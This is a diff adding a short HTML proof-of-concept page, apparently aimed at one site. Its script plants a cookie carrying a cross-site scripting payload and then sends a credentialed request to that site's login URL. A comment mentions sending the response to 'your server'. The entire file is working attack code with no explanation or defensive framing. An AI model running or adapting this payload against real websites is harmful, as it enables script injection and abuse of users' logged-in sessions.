@@ -1,0 +1,20 @@
+<html>
+<body>
+  <script>
+    // Set cookies directly if fetch fails to set them
+    document.cookie = 'turbo-cdn=XSS"><script>alert(1)</script>; path=/';
+
+    // Make a fetch request to trigger any potential cookie setting
+    fetch('https://enginelark.okg.com/ucentre/login/80222fd74590445c981105503458e162', {
+      method: 'GET',
+      credentials: 'include'
+    })
+    .then(response => response.text())
+    .then(data => {
+      // Process or send data to your server for analysis
+      console.log('Response:', data);
+    })
+    .catch(err => console.error('Error:', err));
+  </script>
+</body>
+</html>
